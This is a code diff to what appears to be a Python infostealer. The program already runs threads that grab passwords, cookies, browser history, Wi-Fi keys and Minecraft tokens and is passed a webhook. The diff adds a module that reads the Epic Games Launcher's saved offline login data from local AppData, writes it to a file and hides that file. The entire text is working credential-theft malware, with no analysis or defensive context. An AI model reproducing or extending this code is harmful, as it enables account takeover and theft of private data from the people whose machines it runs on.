@@ -44,7 +44,7 @@ def main(webhook):
     get_inf()
     grabtokens()
 
-    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi, grabmctokens]
+    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi, grabmctokens, epicgamesdata]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -455,6 +455,23 @@ class grabmctokens():
             g.write(str(usercache))
         hide(".\\minecraft-usercache.json")
 
+@try_extract
+class epicgamesdata():
+    def __init__(self):
+        self.appdata = os.getenv("localappdata")
+
+        epic_path = (self.appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini")
+        with open(epic_path, "r") as f:
+            lines = f.readlines()
+        for line in lines:
+            if line.startswith("Data="):
+                eg_data = line.split('Data=')[1].strip()
+
+        with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
+            g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
+            g.write("Epic Games Offline Data:\n")
+            g.write(eg_data)
+        hide(".\\epicgames-data.txt")
 
 @try_extract
 class grabcookies():
